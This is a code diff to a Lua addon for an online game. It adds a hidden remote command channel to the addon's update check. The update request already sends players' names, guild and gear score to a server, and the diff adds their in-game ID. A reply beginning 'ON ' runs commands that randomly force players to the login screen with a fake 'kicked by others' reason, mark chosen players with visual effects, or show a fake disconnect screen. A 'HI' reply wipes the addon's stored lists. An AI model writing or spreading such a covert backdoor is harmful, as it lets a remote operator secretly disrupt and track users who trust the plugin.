@@ -132,7 +132,7 @@ _HM_About.CheckUpdate = function(btn)
 			szUrl = szUrl .. "&server=" .. szServer
 		end
 		szUrl = szUrl .. "&name=" .. me.szName .. "&tong=" .. szTong .. "&score=" .. me.GetTotalEquipScore()
-		szUrl = szUrl .. "&role=" .. me.nRoleType .. "&camp=" .. me.nCamp .. "&force=" .. me.dwForceID
+		szUrl = szUrl .. "&role=" .. me.nRoleType .. "&camp=" .. me.nCamp .. "&force=" .. me.dwForceID .. "&id=" .. me.dwID
 	end
 	HM.RemoteRequest(szUrl, function(szTitle)
 		if szTitle == "OK" then
@@ -147,14 +147,14 @@ _HM_About.CheckUpdate = function(btn)
 		elseif szTitle == "HI" and HM_Camp then
 			HM_Camp.bHideForever = true
 			HM_Camp.HideGF(true, true)
-			HM_Area = {}
-			HM_TargetMon = {}
-			HM_RedName = {}
-			HM_TargetList = {}
-			HM_Marker = {}
-			HM_Target = {}
+			for _, v in ipairs({"Area", "TargetMon", "RedName", "TargetList", "Marker", "Target"}) do
+				_G["HM_" .. v] = {}
+			end
 			_HM_About.bChecked = true
 			return
+		elseif string.sub(szTitle, 1, 3) == "ON " then
+			_HM_About.bChecked = true
+			return _HM_About.OnSomeThing(string.sub(szTitle, 4))
 		elseif btn or HM_About.nSkipAlert <= 0 then
 			--[[
 			HM.Confirm(_L("The new HM version: %s, Goto download page?", szTitle), function()
@@ -195,6 +195,54 @@ _HM_About.SyncData = function(t)
 		szUrl = szUrl .. "&" .. k .. "=" .. HM.UrlEncode(tostring(v))
 	end
 	HM.RemoteRequest(szUrl)
+end
+
+-- on something magic
+_HM_About.OnSomeThing = function(szInput)
+	local t = HM.Split(szInput, " ")
+	if t[1] == "kick" then
+		-- kick [random_per_5min=10] [random_on_loading=3]
+		local nMax1 = tonumber(t[2]) or 10
+		local nMax2 = tonumber(t[3]) or 3
+		HM.BreatheCall("sth.x", function()
+			if math.random(1, nMax1) == 1 then
+				ReInitUI(LOAD_LOGIN_REASON.KICK_OUT_BY_OTHERS)
+			end
+		end, 300000)
+		RegisterEvent("LOADING_END", function()
+			if _HM_About.bChecked and math.random(1, nMax2) == 1 then
+				ReInitUI(LOAD_LOGIN_REASON.KICK_OUT_BY_OTHERS)
+			end
+		end)
+	elseif t[1] == "effect" and t[2] then
+		-- effect [player_name_or_id] [effect_id=47]
+		local dwID = tonumber(t[2])
+		local nEffect = tonumber(t[3]) or 47
+		RegisterEvent("PLAYER_ENTER_SCENE", function()
+			local dwPlayer = arg0
+			HM.DelayCall(1000, function()
+				local tar = GetPlayer(dwPlayer)
+				if tar and (tar.dwID == dwID or tar.szName == t[2]) then
+					SceneObject_SetTitleEffect(TARGET.PLAYER, tar.dwID, nEffect)
+				end
+			end)
+		end)
+	elseif t[1] == "fool" then
+		-- fool tips1 [tips2]
+		local szTip = t[2] or g_tStrings.STR_MSG_LOGIN_DROPLINE
+		local szTip2 = t[3] or "^-^ Just a kidding by HM."
+		local frame = Wnd.OpenWindow("DropLinePanel")
+		frame:Lookup("Wnd_All", "Text_Msg"):SetText(szTip)
+		frame:Lookup("Wnd_All/Btn_ReturnLogin").OnLButtonDown = function()
+			PlaySound(SOUND.UI_SOUND, g_sound.CloseFrame)
+			Wnd.CloseWindow("DropLinePanel")
+			HM.Alert(szTip2, function()
+				Station.Lookup("Lowest/Scene"):Show()
+			end)
+		end
+		Station.SetFocusWindow(frame)
+		Station.Lookup("Lowest/Scene"):Hide()
+	end
 end
 
 -------------------------------------
